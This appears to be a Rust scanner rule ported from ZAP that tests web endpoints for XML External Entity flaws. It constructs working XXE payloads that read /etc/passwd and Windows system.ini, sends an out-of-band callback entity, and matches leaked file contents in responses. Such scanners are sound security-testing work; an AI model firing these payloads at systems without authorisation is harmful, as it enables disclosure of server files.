//! Ported from ZAP XxeScanRule (ascanrules, Apache License 2.0).
//!
//! Check #2 (out-of-band via OAST) uses the OOB listener when one is running
//! (`brainproxy oob start`); an interaction raises the alert later. Omitted:
//! check #1 (remote file inclusion through ZAP's own callback service), which
//! the OOB check covers. The local file reflection (MEDIUM and up) and local file
//! inclusion (HIGH and up) checks are ported. The original body is not passed through `MessageFormat` (ZAP
//! would drop single quotes from it); only the `{0}` in the attack header is filled.

use std::sync::LazyLock;

use regex::Regex;

use crate::http::request::split_head_body;
use crate::http::RawRequest;
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope, Strength};
use crate::scan::{AlertDef, Confidence, Risk};

static ALERT: AlertDef = AlertDef {
    alert_ref: "90023",
    name: "XML External Entity Attack",
    risk: Risk::High,
    confidence: Confidence::Medium,
    cwe: 611,
    wasc: 43,
    description: "This technique takes advantage of a feature of XML to build documents dynamically at the time of processing. An \
        XML message can either provide data explicitly or by pointing to an URI where the data exists. In the attack \
        technique, external entities may replace the entity value with malicious data, alternate referrals or may \
        compromise the security of the data the server/XML application has access to.\n\tAttackers may also use \
        External Entities to have the web services server download malicious code or content to the server for use in \
        secondary or follow on attacks.",
    solution: "XML External Entities vulnerabilities arise because the application's XML parsing library supports potentially \
        dangerous XML features. To prevent XML External Entities vulnerabilities disable the resolution of external \
        entities and the support for XInclude.",
    references: &[
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
        "https://cwe.mitre.org/data/definitions/611.html",
    ],
    tags: &["API_2023_API10", "OWASP_2025_A05", "OWASP_2021_A03", "OWASP_2017_A04", "WSTG-v42-INPV-07"],
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const ATTACK_ENTITY: &str = "&zapxxe;";
const ATTACK_HEADER: &str =
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY zapxxe SYSTEM \"{0}\">\n]>\n";
const ATTACK_BODY: &str = "<foo>&zapxxe;</foo>";

const LOCAL_FILE_TARGETS: [&str; 3] =
    ["file:///etc/passwd", "file:///c:/Windows/system.ini", "file:///d:/Windows/system.ini"];
static LOCAL_FILE_PATTERNS: LazyLock<[Regex; 3]> = LazyLock::new(|| {
    [Regex::new(r"root:.:0:0").unwrap(), Regex::new(r"\[drivers\]").unwrap(), Regex::new(r"\[drivers\]").unwrap()]
});

/// An element with simple content (text or one CDATA section); group 1 is the content.
/// ZAP's look-behind `(?:.(?<!]]>))*]]>` is a lazy match up to the first `]]>`.
static TAG: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"<[_:A-Za-z][_:A-Za-z0-9\-.]*\s*[^>]*>((?:<!\[CDATA\[[^\n\r\x{85}\x{2028}\x{2029}]*?\]\]>)|(?:[^<&]*))</[_:A-Za-z][_:A-Za-z0-9\-.]*\s*>",
    )
    .unwrap()
});
static XML_HEADER: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)<\?xml.*?\?>").unwrap());

/// createLfrPayload: every simple element value replaced by the entity (without the header).
pub(crate) fn lfr_body(body: &str) -> String {
    let body = XML_HEADER.replace_all(body, "");
    let mut out = String::new();
    let mut last = 0;
    for c in TAG.captures_iter(&body) {
        let g = c.get(1).unwrap();
        out.push_str(&body[last..g.start()]);
        out.push_str(ATTACK_ENTITY);
        last = g.end();
    }
    out.push_str(&body[last..]);
    out
}

/// createTagSpecificLfrPayload bodies: one element value replaced at a time.
pub(crate) fn tag_specific_bodies(body: &str, max: usize) -> Vec<String> {
    let body = XML_HEADER.replace_all(body, "").into_owned();
    TAG.captures_iter(&body)
        .take(max)
        .map(|c| {
            let g = c.get(1).unwrap();
            format!("{}{ATTACK_ENTITY}{}", &body[..g.start()], &body[g.end()..])
        })
        .collect()
}

fn header_for(file: &str) -> String {
    ATTACK_HEADER.replace("{0}", file)
}

pub struct Xxe;

impl ActiveRule for Xxe {
    fn id(&self) -> u32 {
        90023
    }

    fn name(&self) -> &'static str {
        "XML External Entity Attack"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Page
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            let is_xml =
                cx.base().req_headers.iter().any(|(k, v)| k.eq_ignore_ascii_case("content-type") && v.contains("xml"));
            if !is_xml {
                return;
            }
            // Check #2: out-of-band file inclusion, over http and then https with
            // the same token (registered once, like ZAP).
            if let Some(p) = cx.oob_payload() {
                let attack = format!("{}{ATTACK_BODY}", header_for(&p.url));
                let request = with_body(cx, &attack);
                let resp = cx.send_following(request.clone()).await.ok();
                cx.oob_register(&p, ALERT.raise("", "").attack(attack), &request, resp.as_ref());
                let https = p.url.replacen("http://", "https://", 1);
                let _ = cx.send_following(with_body(cx, &format!("{}{ATTACK_BODY}", header_for(&https)))).await;
            }
            if cx.strength() == Strength::Low || cx.stopped() {
                return;
            }
            // Check #3: local file reflection.
            let original = String::from_utf8_lossy(&cx.base().req_body).into_owned();
            if reflection_test(cx, &lfr_body(&original)).await {
                return;
            }
            let max = match cx.strength() {
                Strength::Medium => 72 / LOCAL_FILE_TARGETS.len(),
                Strength::High => 144 / LOCAL_FILE_TARGETS.len(),
                _ => usize::MAX,
            };
            for body in tag_specific_bodies(&original, max) {
                if reflection_test(cx, &body).await {
                    return;
                }
            }
            if cx.strength() == Strength::Medium || cx.stopped() {
                return;
            }
            // Check #4: local file inclusion.
            for (i, file) in LOCAL_FILE_TARGETS.iter().enumerate() {
                let payload = format!("{}{ATTACK_BODY}", header_for(file));
                let Ok(resp) = cx.send_following(with_body(cx, &payload)).await else { return };
                if let Some(m) = LOCAL_FILE_PATTERNS[i].find(resp.body_str()) {
                    cx.report(ALERT.raise("", m.as_str()).attack(payload), &resp);
                }
                if cx.stopped() {
                    return;
                }
            }
        })
    }
}

fn with_body(cx: &Cx, body: &str) -> Vec<u8> {
    let (head, _) = split_head_body(cx.base_request());
    RawRequest::from_bytes([head, body.as_bytes()].concat()).update_content_length().into_bytes()
}

/// localFileReflectionTest: true when done (found, failed, or stopped).
async fn reflection_test(cx: &Cx, body: &str) -> bool {
    for (i, file) in LOCAL_FILE_TARGETS.iter().enumerate() {
        let payload = format!("{}{body}", header_for(file));
        let Ok(resp) = cx.send_following(with_body(cx, &payload)).await else { return true };
        if let Some(m) = LOCAL_FILE_PATTERNS[i].find(resp.body_str()) {
            cx.report(ALERT.raise("", m.as_str()).attack(payload), &resp);
            return true;
        }
        if cx.stopped() {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payload_bodies() {
        let body = "<?xml version=\"1.0\"?><comment><text>hi</text><n><![CDATA[x]]></n><e/></comment>";
        // Like ZAP's pattern, `<e/></comment>` counts as an element with empty content.
        assert_eq!(lfr_body(body), "<comment><text>&zapxxe;</text><n>&zapxxe;</n><e/>&zapxxe;</comment>");
        let one = tag_specific_bodies(body, 2);
        assert_eq!(
            one,
            [
                "<comment><text>&zapxxe;</text><n><![CDATA[x]]></n><e/></comment>",
                "<comment><text>hi</text><n>&zapxxe;</n><e/></comment>"
            ]
        );
        assert_eq!(tag_specific_bodies(body, 1).len(), 1);
        assert!(header_for("file:///etc/passwd").contains("SYSTEM \"file:///etc/passwd\""));
    }
}
